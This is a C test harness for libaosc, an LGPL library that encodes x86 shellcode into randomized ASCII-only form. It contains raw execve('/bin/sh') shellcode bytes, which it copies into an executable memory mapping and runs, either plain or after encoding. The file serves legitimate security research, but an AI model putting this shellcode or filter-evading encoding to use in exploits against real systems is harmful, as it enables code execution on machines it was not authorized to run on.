/* libaosc, an encoding library for randomized x86 ASCII-only shellcode.
 *
 * Dedicated to Kanna Ishihara.
 *
 * Copyright (C) 2001-2009 Ronald Huizer
 *
 * This library is free software; you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as
 * published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include "rand.h"
#include "x86_ascii.h"
#include "wrapper.h"
#include "shellcode.h"

#define MAX_NOPS 1000

#define MODE_NONE	0
#define MODE_ENCODE	1

unsigned char shellcode32[] =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

static void usage(const char *progname)
{
	fprintf(stderr, "Use as: %s [-h] [-n]\n",
	        progname != NULL ? progname : "exec-sh-test");
}

int main(int argc, char **argv)
{
	unsigned int foo, bar, numnops;
	int mode = MODE_ENCODE;
	char *ascii_code;
	void *address;
	int opt;

	opterr = 0;
	while ( (opt = getopt(argc, argv, "hn")) != -1) {
		switch (opt) {
		case 'h':
			usage(argv[0]);
			exit(EXIT_SUCCESS);
		case 'n':
			mode = MODE_NONE;
			break;
		}
	}

	address = mmap(NULL, 31337, PROT_READ | PROT_WRITE | PROT_EXEC,
	                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (address == NULL) {
		perror("mmap()");
		exit(EXIT_FAILURE);
	}

	/* If we have requested executing the non-encoded payload, do so
	 * right here.
	 */
	if (mode == MODE_NONE) {
#if defined(__i386__)
		memcpy(address, shellcode32, sizeof(shellcode32) - 1);
#elif defined(__x86_64__)
		memcpy(address, shellcode64, shellcode64_len);
#endif
		((void(*)())address)();
		exit(EXIT_SUCCESS);
	}

	rand_init();
	numnops = rand_uint32_range(0, 1000);
	foo = rand_uint32_range(0, numnops);
	bar = rand_uint32_range(0, numnops);

	/* aos_encode() the shellcode code, with a return address of
	 * 'address' and use NUMNOPS nops
	 */
#if defined(__i386__)
	ascii_code = aosc_encode_32(shellcode, sizeof(shellcode) - 1, (uint32_t)address + foo, numnops);
#elif defined(__x86_64__)
	ascii_code = aosc_encode_64(shellcode64, shellcode64_len, (uint64_t)address + foo, 0);
#endif

	printf("Executing shellcode:\n\n");
	printf("%s\n", ascii_code);
	printf("\nReturn address: %p - Encoded return address: %p\n",
					 address + bar, address + foo);
	fflush(stdout);

	memcpy(address, ascii_code, strlen(ascii_code));
	free(ascii_code);

#if defined(__i386__)
	((void(*)())address + bar)();
#elif defined(__x86_64__)
	((void(*)())address)();
#endif

	exit(EXIT_FAILURE);
}
